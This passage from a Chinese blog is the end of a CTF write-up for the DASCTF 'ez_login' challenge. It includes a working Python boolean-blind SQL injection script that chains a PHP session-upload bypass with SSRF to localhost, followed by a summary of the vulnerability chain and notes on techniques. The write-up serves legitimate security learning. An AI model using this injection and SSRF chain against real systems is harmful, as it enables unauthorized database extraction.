+</blockquote>
+<p><strong>Python 自动化盲注脚本示例</strong>：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://39999babc1fb2e7167634286.http-ctf2.dasctf.com/&quot;</span></span><br><span class="line">sessid = <span class="string">&quot;your_session_id&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inject</span>(<span class="params">payload</span>):</span><br><span class="line">    cookies = &#123;<span class="string">&quot;PHPSESSID&quot;</span>: sessid&#125;</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>: <span class="string">&quot;mochu7&quot;</span>,</span><br><span class="line">        <span class="string">&quot;file&quot;</span>: (<span class="string">&quot;m.txt&quot;</span>, <span class="string">&quot;mochu7&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># SSRF 请求 se1f_Log3n.php，注入 payload 通过 username 传入</span></span><br><span class="line">    <span class="comment"># 需要根据 se1f_Log3n.php 的参数接收方式调整</span></span><br><span class="line">    r = requests.post(url, cookies=cookies, files=data, data=&#123;</span><br><span class="line">        <span class="string">&quot;url&quot;</span>: <span class="string">f&quot;http://localhost/se1f_Log3n.php?username=<span class="subst">&#123;payload&#125;</span>&amp;password=1&quot;</span></span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;error&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 猜数据库名</span></span><br><span class="line">db_name = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">        payload = <span class="string">f&#x27;&quot; or ord(substr(database(),<span class="subst">&#123;i&#125;</span>,1))=<span class="subst">&#123;c&#125;</span>-- -&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> inject(payload):</span><br><span class="line">            db_name += <span class="built_in">chr</span>(c)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[+] 数据库名: <span class="subst">&#123;db_name&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[*] 最终数据库名: <span class="subst">&#123;db_name&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="漏洞链总结"><a href="#漏洞链总结" class="headerlink" title="漏洞链总结"></a>漏洞链总结</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PHP_SESSION_UPLOAD_PROGRESS 绕 session 检查</span><br><span class="line">  --&gt; localhost 绕 check_inner_ip</span><br><span class="line">    --&gt; SSRF 访问内网 admin.php</span><br><span class="line">      --&gt; HTML 注释泄露源码包路径</span><br><span class="line">        --&gt; SSRF 下载 yuanma_f0r_eAZy_logon.zip</span><br><span class="line">          --&gt; 发现 se1f_Log3n.php SQL 注入点（双引号闭合）</span><br><span class="line">            --&gt; 布尔盲注脱库获取 flag</span><br></pre></td></tr></table></figure>
+
+<h2 id="知识点梳理"><a href="#知识点梳理" class="headerlink" title="知识点梳理"></a>知识点梳理</h2><ol>
+<li><strong>PHP_SESSION_UPLOAD_PROGRESS</strong>：PHP 文件上传时自动初始化 session 的机制，可绕过无 <code>session_start()</code> 的 session 检查。这是 PHP &lt; 8.0 中一个常被忽视的 session 初始化入口。</li>
+<li><strong>SSRF 绕过 IP 限制</strong>：<code>localhost</code> 可绕过基于 <code>gethostbyname</code> + 内网 IP 段判断的检查函数，因为 <code>localhost</code> 在某些实现中不被解析为 <code>127.0.0.1</code>（或正则未覆盖）。</li>
+<li><strong>check_inner_ip 黑盒测试方法</strong>：通过构造不同格式的 URL（IP 十进制、十六进制、域名等）观察返回结果差异，推断函数的检测逻辑。</li>
+<li><strong>SQL 双引号闭合盲注</strong>：当 SQL 语句用双引号拼接且无过滤时，可直接构造 <code>&quot;</code> 闭合 + <code>or</code> 条件的盲注 payload。</li>
+<li><strong>HTML 注释信息泄露</strong>：开发者在 HTML 注释中留下的源码路径线索，属于常见的信息泄露类型。</li>
+<li><strong>curl FOLLOWLOCATION</strong>：<code>CURLOPT_FOLLOWLOCATION=1</code> 会跟随 302 重定向，在 SSRF 中可能被利用来扩大攻击面。</li>
+</ol>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://penguin3k.cn">penguin2k</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://penguin3k.cn/2026/11/07/ez-login/">http://penguin3k.cn/2026/11/07/ez-login/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://penguin3k.cn" target="_blank">MY BLOG</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://raw.githubusercontent.com/penguin3k/mypicture/main/img/uwp3874271.jpeg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2026/11/07/ez-logn/" title=""><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info"></div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://raw.githubusercontent.com/penguin3k/mypicture/main/img/uwp3874271.jpeg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">penguin2k</div><div class="author-info__description">不高明</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">18</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">4</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/penguin3k" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:gopenguin3k@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#DASCTF-%E4%B8%89%E6%9C%88%E8%B5%9B-ez-login-WriteUp"><span class="toc-number">1.</span> <span class="toc-text">DASCTF 三月赛 ez_login WriteUp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E4%BF%A1%E6%81%AF"><span class="toc-number">1.1.</span> <span class="toc-text">题目信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text">源码分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#index-php%EF%BC%88%E5%85%A5%E5%8F%A3%E6%96%87%E4%BB%B6%EF%BC%89"><span class="toc-number">1.2.1.</span> <span class="toc-text">index.php（入口文件）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#se1f-Log3n-php%EF%BC%88%E7%99%BB%E5%BD%95%E9%AA%8C%E8%AF%81%E9%80%BB%E8%BE%91%EF%BC%89"><span class="toc-number">1.2.2.</span> <span class="toc-text">se1f_Log3n.php（登录验证逻辑）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%AD%A5%E9%AA%A4"><span class="toc-number">1.3.</span> <span class="toc-text">解题步骤</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A%E7%BB%95%E8%BF%87-no-session-%E6%A3%80%E6%9F%A5"><span class="toc-number">1.3.1.</span> <span class="toc-text">第一步：绕过 no session 检查</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9A%E7%BB%95%E8%BF%87-check-inner-ip"><span class="toc-number">1.3.2.</span> <span class="toc-text">第二步：绕过 check_inner_ip</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9ASSRF-%E8%AE%BF%E9%97%AE%E5%86%85%E7%BD%91-admin-php"><span class="toc-number">1.3.3.</span> <span class="toc-text">第三步：SSRF 访问内网 admin.php</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E6%AD%A5%EF%BC%9A%E5%8F%91%E7%8E%B0%E5%B9%B6%E4%B8%8B%E8%BD%BD%E6%BA%90%E7%A0%81%E5%8C%85"><span class="toc-number">1.3.4.</span> <span class="toc-text">第四步：发现并下载源码包</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%94%E6%AD%A5%EF%BC%9ASQL-%E7%9B%B2%E6%B3%A8%E8%8E%B7%E5%8F%96-flag"><span class="toc-number">1.3.5.</span> <span class="toc-text">第五步：SQL 盲注获取 flag</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E9%93%BE%E6%80%BB%E7%BB%93"><span class="toc-number">1.4.</span> <span class="toc-text">漏洞链总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%E6%A2%B3%E7%90%86"><span class="toc-number">1.5.</span> <span class="toc-text">知识点梳理</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/11/07/ez-login/" title="ez_login">ez_login</a><time datetime="2026-11-07T09:42:33.000Z" title="发表于 2026-11-07 17:42:33">2026-11-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/11/07/ez-logn/" title="无题">无题</a><time datetime="2026-11-07T09:41:03.806Z" title="发表于 2026-11-07 17:41:03">2026-11-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/11/09/%E5%A0%86_%E4%BC%98%E5%85%88%E9%98%9F%E5%88%97/" title="堆_优先队列问题">堆_优先队列问题</a><time datetime="2023-11-09T09:41:22.939Z" title="发表于 2023-11-09 17:41:22">2023-11-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/11/09/%E8%83%8C%E5%8C%85%E9%97%AE%E9%A2%98/" title="零钱兑换问题">零钱兑换问题</a><time datetime="2023-11-09T09:41:22.939Z" title="发表于 2023-11-09 17:41:22">2023-11-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/11/09/Leetcode%E5%85%B6%E4%BB%96/" title="从字符串中找出最长回文">从字符串中找出最长回文</a><time datetime="2023-11-09T09:41:22.934Z" title="发表于 2023-11-09 17:41:22">2023-11-09</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2026 By penguin2k</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
